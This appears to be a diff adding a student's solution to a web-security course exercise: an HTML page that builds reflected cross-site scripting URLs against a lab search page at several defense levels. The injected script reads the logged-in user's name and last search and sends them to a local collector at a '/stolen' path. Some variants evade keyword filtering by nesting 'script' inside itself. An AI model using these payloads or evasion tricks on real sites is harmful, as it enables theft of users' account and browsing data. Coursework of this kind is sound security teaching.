@@ -1,0 +1,17 @@
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+
+<script>
+
+	var baseString = "<script>$(window).load(function(){var user=$('#logged-in-user').html();var lastsearch=$('#history-list').children(':eq(1)').attr('href').split('=')[1];var urlString='http://127.0.0.1:31337/stolen?user='+user+'&last_search='+lastsearch;$.get(urlString);});";
+	var closeScript = "%3C%2Fscript%3E"; 
+	var queryString = encodeURIComponent(baseString) + closeScript;
+	var urlString0 = "http://eecs388.org/project2/search?xssdefense=0&q=" + queryString;
+	var urlString1 = "http://eecs388.org/project2/search?xssdefense=1&q=" + queryString.replace(/script/g,"scrscriptipt");
+	var urlString2 = "http://eecs388.org/project2/search?xssdefense=2&q=" + queryString.replace(/script/g,"scrscriptipt");
+	var urlString3 = "http://eecs388.org/project2/search?xssdefense=3&q=" + queryString;
+	console.log(urlString0);
+</script>
+
